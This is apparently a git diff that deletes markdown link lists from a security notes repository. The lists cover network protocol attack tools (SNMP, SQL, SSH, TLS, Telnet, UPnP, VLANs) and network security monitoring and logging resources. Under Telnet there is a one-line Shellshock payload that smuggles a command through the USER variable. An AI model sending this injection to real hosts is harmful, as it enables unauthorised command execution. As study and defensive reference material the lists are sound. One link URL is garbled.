-	* onesixtyone is an SNMP scanner which utilizes a sweep technique to achieve very high performance. It can scan an entire class B network in under 13 minutes. It can be used to discover devices responding to well-known community names or to mount a dictionary attack against one or more SNMP devices.
-* [SNMPWALK](http://net-snmp.sourceforge.net/docs/man/snmpwalk.html)
-	*  snmpwalk - retrieve a subtree of management values using SNMP GETNEXT requests
-* [Simple Network Management Pwnd](http://www.irongeek.com/i.php?page=videos/derbycon4/t221-simple-network-management-pwnd-deral-heiland-and-matthew-kienow)
-* [Cisc0wn - Cisco SNMP Script](https://github.com/nccgroup/cisco-SNMP-enumeration)
-	* Automated Cisco SNMP Enumeration, Brute Force, Configuration Download and Password Cracking
-
-
-
-
-
-------------
-#### <a name="sql"></a>SQL:
-* See 'SQL' in the Web Section.
-* [SQLMap](https://github.com/sqlmapproject/sqlmap)
-
-	* sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.
-* [PowerUpSQL: A PowerShell Toolkit for Attacking SQL Server](https://github.com/NetSPI/PowerUpSQL)
-	* The PowerUpSQL module includes functions that support SQL Server discovery, auditing for common weak configurations, and privilege escalation on scale. It is intended to be used during internal penetration tests and red team engagements. However, PowerUpSQL also includes many functions that could be used by administrators to quickly inventory the SQL Servers in their ADS domain.
-	* [Documentation](https TLS/SSL Vulnerabilities ://github.com/NetSPI/PowerUpSQL/wiki)
-* [Overview of PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/wiki/Overview-of-PowerUpSQL)
-* [Using Metasploit to Find Vulnerable MSSQL Systems](https://www.offensive-security.com/metasploit-unleashed/hunting-mssql/)
-* [nmap ms-sql-info.nse](https://nmap.org/nsedoc/scripts/ms-sql-info.html)
-
-
-
-
-
-------------
-#### <a name="ssh"></a>SSH: 
-* [The Secure Shell (SSH) Transport Layer Protocol](https://tools.ietf.org/html/rfc4253)
-* [OpenSSH Specs](https://www.openssh.com/specs.html)
-* [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
-* [The SSH Protocol - Snailbook](http://www.snailbook.com/protocols.html)
-* [SSH for Fun and Profit](https://karla.io/2016/04/30/ssh-for-fun-and-profit.html)
-* [OpenSSH User Enumeration Time-Based Attack](http://seclists.org/fulldisclosure/2013/Jul/88)
-* [ssh-audit](https://github.com/arthepsy/ssh-audit)
-	* SSH server auditing (banner, key exchange, encryption, mac, compression, compatibility, security, etc)
-
-
-
-
---------------
-#### <a name="ssl"></a>SSL/TLS
-* [RFC 5246 The Transport Layer Security (TLS) Protocol Version 1.2 ]
-* [Transport Layer Security - Wikipedia](https://en.wikipedia.org/wiki/Transport_Layer_Security)
-[TLS/SSL Vulnerabilities](https://www.gracefulsecurity.com/tls-ssl-vulnerabilities/)
-* [SSL/TLS and PKI History](https://www.feistyduck.com/ssl-tls-and-pki-history/)
-	* A comprehensive history of the most important events that shaped the SSL/TLS and PKI ecosystem. Based on Bulletproof SSL and TLS, by Ivan Ristic.
-* [testssl.sh](https://github.com/drwetter/testssl.sh)
-	* testssl.sh is a free command line tool which checks a server's service on any port for the support of TLS/SSL ciphers, protocols as well as some cryptographic flaws.
-* [SSL & TLS Penetration Testing [Definitive Guide]](https://www.aptive.co.uk/blog/tls-ssl-security-testing/)
-
-
-------------
-#### <a name="stp"></a>STP: 
-* [Spanning Tree Protocol - Wikipedia](https://en.wikipedia.org/wiki/Spanning_Tree_Protocol)
-* [STP MiTM Attack and L2 Mitigation Techniques on the Cisco Catalyst 6500 ](http://www.ndm.net/ips/pdf/cisco/Catalyst-6500/white_paper_c11_605972.pdf)
-* [Spanning Tree Protocol (STP) Introduction](http://www.dummies.com/programming/networking/cisco/spanning-tree-protocol-stp-introduction/)
-
-
-------------
-#### Telnet
-* [Shellshock and the Telnet USER Variable](https://digi.ninja/blog/telnet_shellshock.php)
-	* `telnet 10.1.1.1 -l "() { :;}; /usr/bin/id"`
-
-------------
-### <a name="upnp">TR-069</a>
-* [TR-069 - Wikipedia](https://en.wikipedia.org/wiki/TR-069)
-* [Too Many Cooks; Exploiting the Internet of Tr-069](http://mis.fortunecook.ie/) 
-* [TR-069 – A Crash Course University of New Hampshire Interoperability Laboratory 2009](https://www.iol.unh.edu/sites/default/files/knowledgebase/hnc/TR-069_Crash_Course.pdf)
-
-
-
-------------
-### <a name="upnp">UPnP</a>
-* [Universal Plug and Play (UPnP) Internet Gateway Device - Port Control Protocol Interworking Function (IGD-PCP IWF)](https://tools.ietf.org/html/rfc6970)
-* [UPnP™ Device Architecture 1.1 - upnp.org]
-* [UPNP Hacks](http://www.upnp-hacks.org/igd.html)
-* [Universal Plug and Play - Wikipedia](https://en.wikipedia.org/wiki/Universal_Plug_and_Play)
-* [Ufuzz](https://github.com/phikshun/ufuzz)
-	* UFuzz, or Universal Plug and Fuzz, is an automatic UPnP fuzzing tool. It will enumerate all UPnP endpoints on the network, find the available services and fuzz them. It also has the capability to fuzz HTTP using Burp proxy logs.
-* [miranda-upnp](https://github.com/0x90/miranda-upnp)
-* [UPnP Pentest Toolkit](https://github.com/nccgroup/UPnP-Pentest-Toolkit)
-
-
-------------
-#### <a name="vlan"></a>VLANs
-* [Virtual LAN](https://en.wikipedia.org/wiki/Virtual_LAN)
-* [Virtual Local Area Networks](https://www.cse.wustl.edu/~jain/cis788-97/ftp/virtual_lans/index.html)
-* [VLAN hopping, ARP Poisoning and Man-In-The-Middle Attacks in Virtualized Environments - Ronny L. Bull - ANYCON 2017](http://www.irongeek.com/i.php?page=videos/anycon2017/110-vlan-hopping-arp-poisoning-and-man-in-the-middle-attacks-in-virtualized-environments-dr-ronny-l-bull)
-	* Cloud service providers and data centers offer their customers the ability to deploy virtual machines within multi-tenant environments. These virtual machines are typically connected to the physical network via a virtualized network configuration. This could be as simple as a bridged interface to each virtual machine or as complicated as a virtual switch providing more robust networking features such as VLANs, QoS, and monitoring. In this talk I will demonstrate the effects of VLAN hopping, ARP poisoning and Man-in-the-Middle attacks across every major hypervisor platform, including results of attacks originating from the physically connected network as well as within the virtual networks themselves. Each attack category that is discussed will be accompanied by a detailed proof of concept demonstration of the attack.
-
-
-
-
-
-
-------------
-#### <a name="web"></a>Web:
-* [WPScan](https://github.com/wpscanteam/wpscan)
-	* WPScan is a black box WordPress vulnerability scanner.
-* [WhatWeb](https://github.com/urbanadventurer/WhatWeb)
-	* WhatWeb identifies websites. Its goal is to answer the question, "What is that Website?". WhatWeb recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices. WhatWeb has over 1500 plugins, each to recognise something different. WhatWeb also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors, and more.
-* [webDisco](https://github.com/joeybelans/webDisco)
-	* Web discovery tool to capture screenshots from a list of hosts & vhosts.  Requests are made via IP address and vhosts to determine differences. Additionallty checks for common administrative interfaces and web server  misconfigurations.
-* [w3af](https://github.com/andresriancho/w3af)
-	* w3af: web application attack and audit framework, the open source web vulnerability scanner.
-* [PowerWebShot](https://github.com/dafthack/PowerWebShot)
-	* A PowerShell tool for taking screenshots of multiple web servers quickly.
-
-* [Event Tracing for Windows and Network Monitor](http://blogs.technet.com/b/netmon/archive/2009/05/13/event-tracing-for-windows-and-network-monitor.aspx)
-	* "Event Tracing for Windows, (ETW), has been around for quite a while now as it was introduced in Windows 2000. It's basically instrumented logging that describes what a component is doing. Conceptually, it-s something like the proverbial printf("here1") concept used by programmers, but it is present in retail builds. When you enable logging in a component the result is an ETL (Event Trace Log) file. What-s new is that that Network Monitor can read any ETL file. And with the supplied parsers many network oriented ETW providers can be decoded."
-
-
-
-
-
-
-------------
-### <a name="other">Other</a>
-
-
-* [Home Network Administration Protocol - Wikipedia](https://en.wikipedia.org/wiki/Home_Network_Administration_Protocol)
-	* Home Network Administration Protocol (HNAP) is a proprietary network protocol invented[1] by Pure Networks, Inc. and acquired by Cisco Systems which allows identification, configuration, and management of network devices. HNAP is based on SOAP.[2]
-* [More on HNAP - What is it, How to Use it,How to Find it](https://isc.sans.edu/diary/More+on+HNAP+-+What+is+it%2C+How+to+Use+it%2C+How+to+Find+it/17648)
-* [HNAP - Router Security](https://www.routersecurity.org/hnap.php)
-* [More on HNAP - What is it, How to Use it, How to Find it](https://isc.sans.edu/forums/diary/More+on+HNAP+What+is+it+How+to+Use+it+How+to+Find+it/17648/)
-* [Home Network Administration Protocol (HNAP) Whitepaper](https://www.cisco.com/web/partners/downloads/guest/hnap_protocol_whitepaper.pdf)
-* [Hacking D-Link Routers With HNAP](https://regmedia.co.uk/2016/11/07/dlink_hnap_captcha.pdf)
-
-
-------------
-#### <a name="misc"></a>MISC:
-* [t50 - the fastest packet injector.](https://github.com/fredericopissarra/t50)
-	* T50 was designed to perform -Stress Testing-  on a variety of infra-structure
-network devices (Version 2.45), using widely implemented protocols, and after
-some requests it was was re-designed to extend the tests (as of Version 5.3),
-covering some regular protocols (ICMP,  TCP  and  UDP),  some infra-structure
-specific protocols (GRE,  IPSec  and  RSVP), and some routing protocols (RIP,
-EIGRP and OSPF).
-* [C3CM: Defeating the Command - Control - and Communications of Digital Assailants](http://www.irongeek.com/i.php?page=videos/derbycon4/t206-c3cm-defeating-the-command-control-and-communications-of-digital-assailants-russ-mcree)
-	* C3CM: the acronym for command- control- and communi - cations countermeasures. Ripe for use in the information security realm, C3CM takes us past C2 analysis and to the next level. Initially, C3CM was most often intended to wreck the command and control of enemy air defense networks, a very specific military mission. We-ll apply that mindset in the context of combating bots and other evil. Our version of C3CM therefore is to identify, interrupt, and counter the command, control, and communications capabilities of our digital assailants. The three phases of C3CM will utilize: Nfsight with Nfdump, Nfsen, and fprobe to conduct our identification phase, Bro with Logstash and Kibana for the interruption phase, and ADHD for the counter phase. Converge these on one useful platform and you too might have a chance deter those who would do you harm. We-ll discuss each of these three phases (identify, interrupt, and counter) with tooling and tactics, complete with demonstrations and methodology attendees can put to use in their environments. Based on the three part ISSA Journal Toolsmith series: http://holisticinfosec. blogspot.com/search?q=c3cm&max-results=20&by-date=true
diff --git a/Draft/Network Security Monitoring & Logging.md b/Draft/Network Security Monitoring & Logging.md
deleted file mode 100755
index e4d5841..0000000
--- a/Draft/Network Security Monitoring & Logging.md	
+++ /dev/null
@@ -1,402 +0,0 @@
-##Network Security Monitoring
-
-
-
-Cull
-* [Presentations/Videos](#videos)
-* [Writeups](#writeups)
-* [Tools](#tools)
-* [IDS/IPS](#ips)
-* [IDS/IPS Monitoring](#monitor)
-* [Logging](#log)
-	* [Linux](#linux)
-	* [Windows](#win)
-* [PCaps/Static Data](#pcap)
-* Making Sense of the Data
-* [Papers](#papers)
-* [Tricks & Tips](#tricks)
-
-
-
-##### To Do
-* Create incident Response section
-* Break out Threat hunting stuff
-* Break out Logging stuff into "logging" for system specific logging
-
-#### Cull
-[laikaboss](https://github.com/lmco/laikaboss)
-
-http://www.netfort.com/wp-content/uploads/PDF/WhitePapers/NetFlow-Vs-Packet-Analysis-What-Should-You-Choose.pdf
-
-[Response Operation Collections Kit Reference Build](https://github.com/rocknsm/rock)
-
-
-[Infection Monkey](https://github.com/guardicore/monkey)
-* The Infection Monkey is an open source security tool for testing a data center's resiliency to perimeter breaches and internal server infection. The Monkey uses various methods to self propagate across a data center and reports success to a centralized Command and Control(C&C) server.
-
-[Hunting Red Team Empire C2 Infrastructure](http://www.chokepoint.net/2017/04/hunting-red-team-empire-c2.html)
-
-[Get-InjectedThread.ps1](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
-* Looks for threads that were created as a result of code injection.
-
-#### End Cull
-
-
-
-
-
-
-
-### <a name="videos">Presentations/Videos</a>
-[Logging ALL THE THINGS Without All The Cost With Open Source Big Data Tools - DEFCON22 - Zach Fasel](https://www.youtube.com/watch?v=2AAnVeIwXBo)
-* Many struggle in their job with the decision of what events to log in battle against costly increases to their licensing of a commercial SIEM or other logging solution. Leveraging the open source solutions used for "big-data" that have been proven by many can help build a scalable, reliable, and hackable event logging and security intelligence system to address security and (*cringe*) compliance requirements. We’ll walk through the various components and simple steps to building your own logging environment that can extensively grow (or keep sized just right) with just additional hardware cost and show numerous examples you can implement as soon as you get back to work (or home).
-
-[Current State of Virtualizing Network Monitoring](https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t202-current-state-of-virtualizing-network-monitoring-daniel-lohin-ed-sealing)
-
-[The fox is in the Henhouse - Detecting a breach before the damage is done](http://www.irongeek.com/i.php?page=videos/houseccon2015/t302-the-fox-is-in-the-henhouse-detecting-a-breach-before-the-damage-is-done-josh-sokol)
-
-[Passive IPS Reconnaissance and Enumeration - false positive (ab)use - Arron Finnon](https://vimeo.com/108775823)
-* Network Intrusion Prevention Systems or NIPS have been plagued by "False Positive" issues almost since their first deployment. A "False Positive" could simply be described as incorrectly or mistakenly detecting a threat that is not real. A large amount of research has gone into using "False Positive" as an attack vector either to attack the very validity of an IPS system or to conduct forms of Denial of Service attacks. However the very reaction to a "False Positive" in the first place may very well reveal more detailed information about defences than you might well think.
-
-[Public:Windows Event Log Zero 2 Hero Slides](https://docs.google.com/presentation/d/1dkrldTTlN3La-OjWtkWJBb4hVk6vfsSMBFBERs6R8zA/edit#slide=id.g21acf94f3f_2_27)
-
-
-
-
-
-
-
-
-### <a name="writeups"></a>Writeups
-
-[Many ways of malware persistence (that you were always afraid to ask) ](http://jumpespjump.blogspot.com/2015/05/many-ways-of-malware-persistence-that.html)
-
-[Shellcode Analysis Pipeline](https://7h3ram.github.io/2014/3/18/shellcode-pipeline/)
-* I recently required an automated way of analyzing shellcode and verifying if it is detected by Libemu, Snort, Suricata, Bro, etc. Shellcode had to come from public sources like Shell-Storm, Exploit-DB and Metasploit. I needed an automated way of sourcing shellcode from these projects and pass it on to the analysis engines in a pipeline-like mechanism. This posts documents the method I used to complete this task and the overall progress of the project.
-
-[Building a Home Network Configured to Collect Artifacts for Supporting Network Forensic Incident Response](https://www.sans.org/reading-room/whitepapers/forensics/building-home-network-configured-collect-artifacts-supporting-network-forensic-incident-response-37302)
-
-[Automating large-scale memory forensics](https://medium.com/@henrikjohansen/automating-large-scale-memory-forensics-fdc302dc3383)
-
-
-
-
-
-
-### <a name="tools">Tools</a>
-[Security Onion](http://blog.securityonion.net/p/securityonion.html)
-* Security Onion is a Linux distro for intrusion detection, network security monitoring, and log management. It's based on Ubuntu and contains Snort, Suricata, Bro, OSSEC, Sguil, Squert, Snorby, ELSA, Xplico, NetworkMiner, and many other security tools. The easy-to-use Setup wizard allows you to build an army of distributed sensors for your enterprise in minutes!
-
-[Pip3line, the Swiss army knife of byte manipulation](https://nccgroup.github.io/pip3line/index.html) 
-* Pip3line is a raw bytes manipulation utility, able to apply well known and less well known transformations from anywhere to anywhere (almost).
-
-[RITA - Real Intelligence Threat Analytics](https://github.com/ocmdev/rita)
-* RITA is an open source network traffic analysis framework.
-
-[Malcom - Malware Communication Analyzer](https://github.com/tomchop/malcom)
-* Malcom is a tool designed to analyze a system's network communication using graphical representations of network traffic, and cross-reference them with known malware sources. This comes handy when analyzing how certain malware species try to communicate with the outside world.
-
-[Captipper](http://www.omriher.com/2015/01/captipper-malicious-http-traffic.html)
-* CapTipper is a python tool to analyze, explore and revive HTTP malicious traffic. 
-CapTipper sets up a web server that acts exactly as the server in the PCAP file, 
-and contains internal tools, with a powerful interactive console, for analysis and inspection of the hosts, objects and conversations found.  
-
-[CapLoader](http://www.netresec.com/?page=CapLoader) 
-*  CapLoader is a Windows tool designed to handle large amounts of captured network traffic. CapLoader performs indexing of PCAP/PcapNG files and visualizes their contents as a list of TCP and UDP flows. Users can select the flows of interest and quickly filter out those packets from the loaded PCAP files. Sending the selected flows/packets to a packet analyzer tool like Wireshark or NetworkMiner is then just a mouse click away. 
-
-[dnstwist](https://github.com/elceef/dnstwist)
-* Domain name permutation engine for detecting typo squatting, phishing and corporate espionage
-
-[PowerShellMethodAuditor](https://github.com/zacbrown/PowerShellMethodAuditor)
-
-[WMI-IDS](https://github.com/fireeye/flare-wmi/tree/master/WMI-IDS)
-* WMI-IDS is a proof-of-concept agent-less host intrusion detection system designed to showcase the unique ability of WMI to respond to and react to operating system events in real-time.
-
-[Stenographer](https://github.com/google/stenographer/blob/master/README.md)
-* Stenographer is a full-packet-capture utility for buffering packets to disk for intrusion detection and incident response purposes. It provides a high-performance implementation of NIC-to-disk packet writing, handles deleting those files as disk fills up, and provides methods for reading back specific sets of packets quickly and easily.
-
-[Netdude](http://netdude.sourceforge.net/)
-* The Network Dump data Displayer and Editor is a framework for inspection, analysis and manipulation of tcpdump trace files. It addresses the need for a toolset that allows easy inspection, modification, and creation of pcap/tcpdump trace files. Netdude builds on any popular UNIX-like OS, such as Linux, the BSDs, or OSX.
-
-
-
-
-
-
-
-
-### <a name="ips">IDS/IPS</a>
-
-
-#### [Snort](https://www.snort.org/)
-* A free lightweight network intrusion detection system for UNIX and Windows.
-* [Snort FAQ](https://www.snort.org/faq)
-* [Snort User Manual](http://manual.snort.org/)
-* [Snort Documentation](https://www.snort.org/documents)
-
-#### [Bro](https://www.bro.org/index.html)
-* Bro is a powerful network analysis framework that is much different from the typical IDS you may know. 
-
-* [Bro FAQ](https://www.bro.org/documentation/faq.html)
-* [Bro Documentation](https://www.bro.org/documentation/index.html)
-* [Bro Training Exercises](https://www.bro.org/documentation/exercises/index.html)
-* [Download Bro](https://www.bro.org/download/index.html)
-* [Try Bro in your browser!](http://try.bro.org/#/trybro)
-* [Bro QuickStart](https://www.bro.org/sphinx/quickstart/index.html)
-* [Writing Bro Scripts](https://www.bro.org/sphinx/scripting/index.html)
-* [Bro Script References](https://www.bro.org/sphinx/script-reference/index.html)
-
-[ bro-intel-generator](https://github.com/exp0se/bro-intel-generator)
-* Script for generating Bro intel files from pdf or html reports
-
-[bro-domain-generation](https://github.com/denji/bro-domain-generation)
-* Detect domain generation algorithms (DGA) with Bro. The module will regularly generate domains by any implemented algorithms and watch for those domains in DNS queries. This script only works with Bro 2.1+.
-
-[Exfil Framework](https://github.com/reservoirlabs/bro-scripts/tree/master/exfil-detection-framework)
-* The Exfil Framework is a suite of Bro scripts that detect file uploads in TCP connections. The Exfil Framework can detect file uploads in most TCP sessions including sessions that have encrypted payloads (SCP,SFTP,HTTPS).
-
-
-
-#### [Suricata](https://suricata-ids.org/)
-* Suricata is a high performance Network IDS, IPS and Network Security Monitoring engine. Open Source and owned by a community run non-profit foundation, the Open Information Security Foundation (OISF).
-* [Suricata Documentation](https://redmine.openinfosecfoundation.org/projects/suricata/wiki)
-* [Suricata Quick Start Guide](https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Quick_Start_Guide)
-* [Suricata Installation Guides for various platforms](https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Suricata_Installation)
-* [Setting up Suricata on a Microtik Router](http://robert.penz.name/849/howto-setup-a-mikrotik-routeros-with-suricata-as-ids/)
-
-#### [Argus](http://qosient.com/argus/#)
-* Argus is an open source layer 2+ auditing tool (including IP audit) written by Carter Bullard which has been under development for over 10 years.
-* [Argus on NSM Wiki](https://www.nsmwiki.org/index.php?title=Argus)
-* [Argus FAQ](http://qosient.com/argus/faq.shtml)
-* [Argus How-To](http://qosient.com/argus/howto.shtml)
-* [Argus Manual](http://qosient.com/argus/manuals.shtml)
-
-[bmon - bandwidth monitor and rate estimator](https://github.com/tgraf/bmon)
-* bmon is a monitoring and debugging tool to capture networking related statistics and prepare them visually in a human friendly way. It features various output methods including an interactive curses user interface and a programmable text output for scripting.
-
-
-
-
-
-
-### DNS
-
-[DNSChef](https://thesprawl.org/projects/dnschef/)
-* DNSChef is a highly configurable DNS proxy for Penetration Testers and Malware Analysts. A DNS proxy (aka "Fake DNS") is a tool used for application network traffic analysis among other uses. For example, a DNS proxy can be used to fake requests for "badguy.com" to point to a local machine for termination or interception instead of a real host somewhere on the Internet.
-
-[Passive DNS](https://github.com/gamelinux/passivedns) 
-* A tool to collect DNS records passively to aid Incident handling, Network Security Monitoring (NSM) and general digital forensics.  * PassiveDNS sniffs traffic from an interface or reads a pcap-file and outputs the DNS-server answers to a log file. PassiveDNS can cache/aggregate duplicate DNS answers in-memory, limiting the amount of data in the logfile without losing the essense in the DNS answer.
-
-[Passive DNS](https://github.com/gamelinux/passivedns)
-* A tool to collect DNS records passively to aid Incident handling, Network
-Security Monitoring (NSM) and general digital forensics.
-* PassiveDNS sniffs traffic from an interface or reads a pcap-file and outputs
-the DNS-server answers to a log file. PassiveDNS can cache/aggregate duplicate
-DNS answers in-memory, limiting the amount of data in the logfile without
-losing the essense in the DNS answer.
-
-
-
-
-
-
-
-
-### <a name="monitor">IDS/IPS Monitoring Tools</a>
-
-[Snorby](https://www.snorby.org/)
-[Snorby - Github](https://github.com/snorby/snorby)
-* Snorby is a ruby on rails web application for network security monitoring that interfaces with current popular intrusion detection systems (Snort, Suricata and Sagan). The basic fundamental concepts behind Snorby are simplicity, organization and power. The project goal is to create a free, open source and highly competitive application for network monitoring for both private and enterprise use.
-
-
-[Squil](https://bammv.github.io/sguil/index.html)
-* Sguil (pronounced sgweel) is built by network security analysts for network security analysts. Sguil's main component is an intuitive GUI that provides access to realtime events, session data, and raw packet captures. Sguil facilitates the practice of Network Security Monitoring and event driven analysis. The Sguil client is written in tcl/tk and can be run on any operating system that supports tcl/tk (including Linux, *BSD, Solaris, MacOS, and Win32). 
-* [Squil FAQ](http://nsmwiki.org/Sguil_FAQ)
-
-[Squert](
-* Squert is a web application that is used to query and view event data stored in a Sguil database (typically IDS alert data). Squert is a visual tool that attempts to provide additional context to events through the use of metadata, time series representations and weighted and logically grouped result sets. The hope is that these views will prompt questions that otherwise may not have been asked. 
-* [Slide Deck on Squert](https://ea01c580-a-62cb3a1a-s-sites.googlegroups.com/site/interrupt0x13h/squert-canheit2014.pdf?attachauth=ANoY7crNJbed8EeVy3r879eb2Uze_ky7eiO-jvwXp2J7ik_hOyk0kK6uhX3_oT3u4Kuzw7AiuTAQhYGze5jdlQ-w8lagM1--XESGAf0ebLBZU6bGYd7mIC9ax1H49jvQHGb8kojEal8bayL0evZpOFqsr135DpazJ6F5HkVACpHyCqh3Gzafuxxog_Ybp7k4IgqltqH0pZddcIcjI0LwhHaj3Al085C3tbw2YMck1JQSeeBYvF9hL-0%3D&attredirects=0)
-* [Install/setup/etc - Github](https://github.com/int13h/squert)
-
-[ROCK NSM](http://rocknsm.io/)
-
-[Response Operation Collections Kit Reference Build](https://github.com/rocknsm/rock)
-
-[flowbat](http://www.appliednsm.com/introducing-flowbat/)
-* Awesome flow tool, SiLK backend
-
-[Stenographer](https://github.com/google/stenographer)
-* Stenographer is a full-packet-capture utility for buffering packets to disk for intrusion detection and incident response purposes. It provides a high-performance implementation of NIC-to-disk packet writing, handles deleting those files as disk fills up, and provides methods for reading back specific sets of packets quickly and easily.
-
-[Aktaion: Open Source Tool For "Micro Behavior Based" Exploit Detection and Automated GPO Policy Generation](https://github.com/jzadeh/Aktaion)
-* Aktaion is a lightweight JVM based project for detecting exploits (and more generally attack behaviors). The project is meant to be a learning/teaching tool on how to blend multiple security signals and behaviors into an expressive framework for intrusion detection. The cool thing about the project is it provides an expressive mechanism to add high level IOCs (micro beahviors) such as timing behavior of a certain malware family.
-
-
-
-
-### <a name="log">Logging - General</a>
-
-[Introduction and Demo to the Elasticsearch, Logstash and Kibana](https://www.youtube.com/watch?v=GrdzX9BNfkg)
-
-[ELSA](https://github.com/mcholste/elsa)
-
-[Elasticsearch: The Definitive Guide The Definitive Guide](https://www.elastic.co/guide/en/elasticsearch/guide/current/index.html)
-
-[LogStash](https://github.com/elasticsearch/logstash)
-* Logstash is a tool for managing events and logs. You can use it to collect logs, parse them, and store them for later use (like, for searching). If you store them in Elasticsearch, you can view and analyze them with Kibana. It is fully free and fully open source. The license is Apache 2.0, meaning you are pretty much free to use it however you want in whatever way.
-* [Getting Started With Logstash](http://logstash.net/docs/1.4.2/tutorials/getting-started-with-logstash)
-* [Logstash Documentation](http://logstash.net/docs/1.4.2/)
-* [logstash anonymize](http://logstash.net/docs/1.4.2/filters/anonymize) * Anonymize fields using by replacing values with a consistent hash.
-
-[Kibana](https://github.com/elasticsearch/kibana)
-* Kibana is an open source (Apache Licensed), browser based analytics and search dashboard for Elasticsearch. Kibana is a snap to setup and start using. Kibana strives to be easy to get started with, while also being flexible and powerful, just like Elasticsearch.
-* [Introduction to Kibana](http://www.elasticsearch.org/guide/en/kibana/current/introduction.html)
-* [Kibana Documentation/Guides](http://www.elasticsearch.org/guide/en/kibana/current/)
-* [Installing Kibana](http://www.elasticsearch.org/overview/kibana/installation/)
-
-
-
-
-
-
-### Making Sense of the Data
-[411](https://github.com/kiwiz/411)
-* Configure Searches to periodically run against a variety of data sources. You can define a custom pipeline of Filters to manipulate any generated Alerts and forward them to multiple Targets.
-
-[PCAPDB](https://github.com/dirtbags/pcapdb)
-* PcapDB is a distributed, search-optimized open source packet capture system. It was designed to replace expensive, commercial appliances with off-the-shelf hardware and a free, easy to manage software system. Captured packets are reorganized during capture by flow (an indefinite length sequence of packets with the same src/dst ips/ports and transport proto), indexed by flow, and searched (again) by flow. The indexes for the captured packets are relatively tiny (typically less than 1% the size of the captured data).
-
-[RITA - Finding Bad Things on Your Network Using Free and Open Source Tools](https://www.youtube.com/watch?v=mpCBOQSjbOA)
-
-[You Pass Butter: Next Level Security Monitoring Through Proactivity](http://www.irongeek.com/i.php?page=videos/nolacon2016/110-you-pass-butter-next-level-security-monitoring-through-proactivity-cry0-s0ups)
-
-
-
-
-
-
-
-
-
-
-
-### <a name="linux">Logging - Linux</a>
-
-[Syslong-ng](https://github.com/balabit/syslog-ng) 
-* syslog-ng is an enhanced log daemon, supporting a wide range of input and output methods: syslog, unstructured text, message queues, databases (SQL and NoSQL alike) and more.
-
-
-
-
-
-
-
-
-
-
-
-### <a name="win">Logging - Windows</a>
-
-[Parsing Text Logs with Message Analyzer - Microsoft](http://blogs.technet.com/b/messageanalyzer/archive/2015/02/23/parsing-text-logs-with-message-analyzer.aspx)
-
-[Windows logging Cheat sheet - Sniper Forensics](https://sniperforensicstoolkit.squarespace.com/storage/logging/Windows%20Logging%20Cheat%20Sheet%20v1.1.pdf)
-
-[Spotting the Adversary with Windows Event Log Monitoring - NSA](https://www.nsa.gov/ia/_files/app/Spotting_the_Adversary_with_Windows_Event_Log_Monitoring.pdf)
-
-[Uncovering Indicators of Compromise (IoC) Using   PowerShell, Event Logs, and  a Traditional Monitoring Tool](https://www.sans.org/reading-room/whitepapers/critical/uncovering-indicators-compromise-ioc-powershell-event-logs-traditional-monitoring-tool-36352)
-
-[Advanced Security Audit Policy Settings](https://technet.microsoft.com/en-us/library/dn319056(v=ws.11).aspx)
-
-[GetInjectedThreads.ps1](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
-* Looks for threads that were created as a result of code injection.
-
-[check_ioc](https://github.com/oneoffdallas/check_ioc)
-* Check_ioc is a script to check for various, selectable indicators of compromise on Windows systems via PowerShell and Event Logs. It was primarily written to be run on a schedule from a monitoring engine such as Nagios, however, it may also be run from a command-line (for incident response).
-
-
-
-#### Powershell Logging
-[Revoke -­ Obfuscation: PowerShell Obfuscation Detection Using Science](https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf)
-
-[Greater Visibility Through PowerShell Logging](https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html)
-
-[block-parser](https://github.com/matthewdunwoody/block-parser)
-* Parser for Windows PowerShell script block logs
-
-#### Windows Event Collector
-
-[Windows Event Collector(For centralizing windows domain logging with no local agent, windows actually has built-in logging freely available)](https://msdn.microsoft.com/en-us/library/bb427443(v=vs.85).aspx)
-
-[Windows event Collector - Setting up source initiated Subscriptions](https://msdn.microsoft.com/en-us/library/bb870973(v=vs.85).aspx)
-
-
-#### Windows Event Forwarding
-
-[Introduction to Windows Event Forwarding](https://hackernoon.com/the-windows-event-forwarding-survival-guide-2010db7a68c4)
-
-[Monitoring what matters – Windows Event Forwarding for everyone (even if you already have a SIEM.)](https://blogs.technet.microsoft.com/jepayne/2015/11/23/monitoring-what-matters-windows-event-forwarding-for-everyone-even-if-you-already-have-a-siem/)
-
-[Use Windows Event Forwarding to help with intrusion detection](https://docs.microsoft.com/en-us/windows/threat-protection/use-windows-event-forwarding-to-assist-in-instrusion-detection)
-
-#### Sysinternals
-
-[Sysmon - The Best Free Windows Monitoring Tool You Aren't Using](http://909research.com/sysmon-the-best-free-windows-monitoring-tool-you-arent-using/)
-
-[SysInternals: SysMon Unleashed](https://blogs.technet.microsoft.com/motiba/2016/10/18/sysinternals-sysmon-unleashed/)
-
-
-
-
-
-
-
-### <a name="pcap">Pcaps/Static Analysis(I.e. you have a pcap file or you're not trying to do live analysis/Aren't trying to use one of the above tools)</a>
-
-[Silk -]()
-* The SiLK analysis suite is a collection of command-line tools for processing SiLK Flow records created by the SiLK packing system. These tools read binary files containing SiLK Flow records and partition, sort, and count these records. The most important analysis tool is rwfilter, an application for querying the central data repository for SiLK Flow records that satisfy a set of filtering options. The tools are intended to be combined in various ways to perform an analysis task. A typical analysis uses UNIX pipes and intermediate data files to share data between invocations of the tools. 
-* [Administering/Installing SiLK](https://tools.netsa.cert.org/confluence/display/tt/Administration)
-* [SiLK Tool Tips](https://tools.netsa.cert.org/confluence/display/tt/Tooltips)
-* [SiLK Reference Guide](https://tools.netsa.cert.org/silk/silk-reference-guide.html)
-* [SiLK Toolsuite Quick Reference Guide](https://tools.netsa.cert.org/silk/silk-quickref.pdf)
-
